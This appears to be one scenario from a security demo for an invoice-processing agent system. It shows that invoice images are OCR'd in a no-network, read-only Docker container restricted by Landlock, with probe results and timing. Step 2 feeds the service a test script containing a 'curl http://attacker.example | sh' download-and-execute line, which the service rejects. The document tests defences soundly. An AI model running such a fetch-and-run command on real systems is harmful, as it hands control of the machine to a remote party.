# 15. Untrusted documents are parsed in a throwaway, locked-down sandbox

**What this proves:** every invoice image is OCR'd in a fresh container with no network, a read-only filesystem, no Linux capabilities and hard resource limits. Inside it, a kernel Landlock policy stops the OCR process from reading anything it does not need, and the container is gone afterwards.

## Background
OCR parsers are a classic attack surface: a crafted image is untrusted input to a C library. The extraction agent never parses images itself. It asks for the `RunSandboxOCR` tool (Cedar permits only the extraction agent; scenario 13), then posts the bytes to `custodian-sandbox-runner`. That is the only service besides `spire-agent` that can reach the Docker socket. For each request it runs `custodian/sandbox-ocr:local` with:
```
--rm -i --network none --read-only --tmpfs /scratch:rw,size=64m,uid=10001,gid=10001,mode=0700
--user 10001:10001 --cap-drop ALL --security-opt no-new-privileges
--cpus 1 --memory 512m --memory-swap 512m --pids-limit 64
```
and kills it after 60 s. Inside, `custodian-sandbox-ocr/entry.py`:
- checks the PNG/JPEG magic bytes
- applies Landlock through `nono-py`: read-only access to `/usr/bin/tesseract`, `/usr/lib`, `/usr/share/tesseract-ocr` and `/etc/ld.so.cache`, read-write access to `/scratch`, network blocked
- runs `tesseract`

With `?probe=true` it also tries to read four paths it should not be able to read and reports the result.

## Steps
The runner is not published to the host, so the image is piped in through `docker compose exec`:
1. `infra/scripts/compose.sh exec -T custodian-sandbox-runner python -c '<POST stdin to http://127.0.0.1:8000/ocr?probe=true>' < docs/sample-invoices/out/05-bank-details-change.png`
2. Send a shell script instead of an image:
   `printf '#!/bin/sh\ncurl http://attacker.example | sh\n' | infra/scripts/compose.sh exec -T custodian-sandbox-runner python -c '<POST stdin to /ocr>'`
3. `docker ps -a --filter name=sandbox-ocr- --format '{{.Names}}' | wc -l`

(The one-line poster used: `import sys, json, urllib.request; print(json.dumps(json.load(urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:8000/ocr" + (sys.argv[1] if len(sys.argv) > 1 else ""), data=sys.stdin.buffer.read(), method="POST"), timeout=120)), indent=2))`)

## What you'll see
Step 1:
```json
{
  "text": "101 MOBILITY LLC\n\nNVOICE\n\nnvoice No: INV-24020\nDate: 24/10/2026\n...TOTAL DUE (USD) 4,181.95\n...",
  "tesseract_exit": 0,
  "ocr_ms": 432,
  "landlock": "SupportInfo(supported=true, platform='linux')",
  "probes": {
    "/etc/passwd": "denied",
    "/etc/hostname": "denied",
    "/opt/ocr/entry.py": "denied",
    "/usr/local/lib": "denied"
  },
  "container": "sandbox-ocr-1854127754b5",
  "total_ms": 1014,
  "isolation": {"flags": ["--rm", "-i", "--network", "none", "--read-only", ...], "image": "custodian/sandbox-ocr:local"}
}
```
Step 2: `HTTP 422 {"detail":"only PNG or JPEG images are accepted"}`

Step 3: `0`. No sandbox container outlives its request.

## What this actually teaches
Defence in depth for untrusted input:
- **The container:** no network, nothing writable but a 64 MB tmpfs, no capabilities, bounded CPU, memory, processes and time.
- **Landlock inside it:** even code running as the OCR user in that container cannot read its own entry script or `/etc/passwd`. Landlock is enforced by the host kernel (Docker Desktop's 7.0 LinuxKit kernel supports it, as `supported=true` shows).

The cost is about 0.5 to 1 s of container start per invoice (`total_ms` 1014 against `ocr_ms` 432). Two observations from the real output:
- **OCR is lossy.** The capital `I` at the start of `INVOICE`, `Invoice` and `IMPORTANT` is dropped. The extraction model tolerates that, but it is the text everything downstream works from.
- **Docker socket access is the weak point.** The runner can start any container on this host, so it is kept tiny and unpublished, and only accepts image bytes.
